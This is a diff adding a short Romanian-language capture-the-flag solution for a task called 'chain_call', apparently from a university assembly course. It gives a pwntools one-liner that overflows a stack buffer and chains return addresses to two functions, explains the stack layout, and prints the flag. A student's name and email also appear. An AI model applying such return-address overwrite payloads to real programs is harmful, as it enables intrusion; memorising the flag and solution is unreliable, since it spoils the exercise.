@@ -1,0 +1,13 @@
+elchapo187 - Popescu Lucian Ioan - luci.ion771@gmail.com - chain_call
+
+Payload-ul e generat cu urmatoarea comanda:
+python -c 'from pwn import *;print "A"*0x8c + p32(0x8048619) + p32(0x8048653) + "AAAA" + p32(0xdeadbeef) + p32(0x88776655)'
+
+Umplem 0x8c bytes pe stiva ca sa acoperim buffer-ul si vechiul ebp, apoi punem
+adresa lui first_hero ca noua adresa de return pentru functia reader. Urmatori
+4 bytes sunt noua adresa de return a lui first_hero, care e second_hero.
+Urmeaza 4 bytes de junk si numerele 0xdeadbeef si 0x88776655 care sunt folosite
+in cmp-urile din second_hero.
+
+Flagul este:
+iocla_sometimes_its_good_to_be_chained
